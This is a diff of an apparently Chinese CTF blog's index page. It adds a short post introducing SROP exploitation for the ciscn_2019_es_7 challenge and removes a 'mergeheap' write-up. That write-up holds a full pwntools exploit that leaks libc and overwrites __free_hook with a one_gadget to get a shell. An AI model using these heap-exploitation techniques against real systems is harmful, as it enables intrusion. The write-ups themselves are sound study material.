@@ -206,6 +206,97 @@
             
 
   
+    <article id="post-ciscn-2019-es-7" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/18/ciscn-2019-es-7/" target="_blank">ciscn_2019_es_7</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/18/ciscn-2019-es-7/" class="archive-article-date">
+        <time datetime="2024-03-18T13:09:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-18</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h5 id="初遇srop"><a href="#初遇srop" class="headerlink" title="初遇srop"></a>初遇srop</h5><p><img src="https://i0.imgs.ovh/2024/03/17/e3xQs.png" alt="image-20240318211119440"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/17/e3KTX.png" alt="image-20240318211144301"></p>
+<p>unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame</p>
+<p><img src="https://i0.imgs.ovh/2024/03/17/e3olU.png" alt="image-20240318212003314"></p>
+<p>要用srop，需满足几个条件</p>
+<p>可以通过栈溢出控制栈的内容。</p>
+<p>需要知道相应的地址。</p>
+<pre><code>     “/bin/sh”
+</code></pre>
+<p>​		Signal Frame</p>
+<p>​		syscall</p>
+<p>​		sigreturn</p>
+<p>题目中已经给了我们gadgets的地址</p>
+<p>首先可以打印出栈地址</p>
+<p><img src="https://i0.imgs.ovh/2024/03/17/e3QBm.png" alt="image-20240318213204641"></p>
+<p>其次返回地址写上了0x4004F1,打印完会再次返回func函数</p>
+<p><img src="https://i0.imgs.ovh/2024/03/17/e3cvR.png" alt="image-20240318214547353"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/18/ciscn-2019-es-7/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hitcon2014-stkof" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -933,105 +1024,9 @@
 
 
   
-    <article id="post-mergeheap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/03/08/mergeheap/" target="_blank">mergeheap</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/03/08/mergeheap/" class="archive-article-date">
-        <time datetime="2024-03-08T12:47:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>保护全开，libc-2.27,malloc大小限制了0x400，有个合并堆的函数，可以合并大于0x400的，不过释放的时候总是和top_chunk合并。所以得用另一种方法泄露libc.</p>
-<p><img src="https://i0.imgs.ovh/2024/03/08/QYjEN.png" alt="image-20240308204851522"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x210</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x210</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">merge(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-<h5 id="这种方法好像不行"><a href="#这种方法好像不行" class="headerlink" title="这种方法好像不行"></a>这种方法好像不行</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>): </span><br><span class="line">	free(i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)	   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)      <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)	   <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>)      <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;f&#x27;</span>)      <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>)      <span class="comment">#9</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merge(<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i0.imgs.ovh/2024/03/08/QY5lR.png" alt="image-20240309145439198"></p>
-<h5 id="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"><a href="#下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂" class="headerlink" title="下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂"></a>下一个堆的size位因为堆2，堆3的合并被改了，具体不太懂</h5><p><img src="https://i0.imgs.ovh/2024/03/08/QYYbp.png" alt="image-20240309150323508"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2024/03/08/QYDXu.png" alt="image-20240309150602685"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/08/QYEBl.png" alt="image-20240309151308724"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,25860)</span></span><br><span class="line">p=process(<span class="string">&quot;./mergeheap&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;len:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">index1,index2</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx1:&#x27;</span>,<span class="built_in">str</span>(index1))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx2:&#x27;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>): </span><br><span class="line">	free(i)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">main_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr-<span class="number">0x80</span>))</span><br><span class="line">main_arena=main_addr-<span class="number">96</span>-<span class="number">0x80</span></span><br><span class="line">malloc=main_arena-<span class="number">0x10</span></span><br><span class="line">base=malloc-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)	   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)      <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)	   <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>)      <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;f&#x27;</span>)      <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>)      <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">merge(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x31</span>)+p64(free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/03/08/mergeheap/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
